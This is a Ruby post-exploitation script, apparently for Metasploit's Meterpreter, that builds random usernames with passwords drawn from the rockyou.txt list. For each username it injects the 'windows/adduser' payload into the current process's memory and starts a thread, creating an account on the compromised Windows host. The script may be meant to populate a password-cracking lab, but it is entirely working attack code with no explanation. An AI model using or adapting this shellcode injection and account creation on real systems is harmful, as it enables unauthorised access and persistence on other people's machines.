namefile = File.new('other-names.txt', 'r')
passwordfile = File.new('rockyou.txt', 'r')
usercount = 5

names = []
namefile.each_line do |line|
	names << line.chomp
end

passwords = []
passwordfile.each_line do |line|
	passwords << line.chomp
end

datesnum = []
(0..9).each do |x|
	datesnum << x
end

(40..99).each do |x|
	datesnum << x
end

(2000..2013).each do |x|
	datesnum << x
end


(0..usercount).each do
	fname = names[rand(names.size)]
	lname = names[rand(names.size)]
	goodpass = rand(3)
	password = case goodpass
	when 0
		passwords[rand(passwords.size)]
	when 1
		"#{passwords[rand(passwords.size)]}#{datesnum[rand(datesnum.size)]}"
	when 2
		"#{passwords[rand(passwords.size)]}#{passwords[rand(passwords.size)]}"
	end
	username = "#{fname[0].chr}#{lname}"
	case goodpass
	when 0
		puts "#{username} has a bad password of #{password}"
	when 1
		puts "#{username} has an ok password of #{password}"
	when 2
		puts "#{username} has a good password of #{password}"
	end
	
	payload = 'windows/adduser'
	pay = client.framework.payloads.create(payload)

	pay.datastore['USER'] = username
	pay.datastore['PASS'] = password

	raw = pay.generate
	host_process = client.sys.process.open(client.sys.process.getpid, PROCESS_ALL_ACCESS)
	mem = host_process.memory.allocate(raw.length + (raw.length % 1024))
	host_process.memory.write(mem, raw)
	host_process.thread.create(mem, 0)
	print_status("#{username} created with password: #{password}")
end
